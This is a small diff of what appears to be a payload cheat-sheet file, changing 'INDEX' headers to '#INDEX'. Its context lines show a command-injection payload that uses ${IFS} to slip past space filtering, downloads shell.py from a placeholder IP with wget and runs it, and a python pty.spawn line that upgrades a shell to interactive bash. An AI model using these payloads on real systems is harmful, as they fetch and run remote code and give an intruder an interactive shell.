@@ -1,4 +1,4 @@
-INDEX
+#INDEX
 
 #EXAMPLE
 
@@ -27,7 +27,7 @@ wget${IFS}http://{IP}/shell.py${IFS}-O${IFS}shell.py;python${IFS}shell.py
 
 python -c 'import pty; pty.spawn("/bin/bash")'
 
-INDEX
+#INDEX
 
 #EXAMPLE
 
